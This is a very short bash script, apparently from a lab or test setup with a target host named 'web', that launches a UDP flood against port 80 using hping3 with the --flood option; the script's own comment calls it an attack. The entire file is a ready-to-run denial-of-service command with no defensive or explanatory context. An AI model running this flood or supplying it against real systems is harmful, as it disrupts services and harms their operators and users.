#!/bin/bash

# Target IP and port
TARGET_IP="web"
TARGET_PORT=80

# Perform UDP flood attack
hping3 --udp -p $TARGET_PORT --flood $TARGET_IP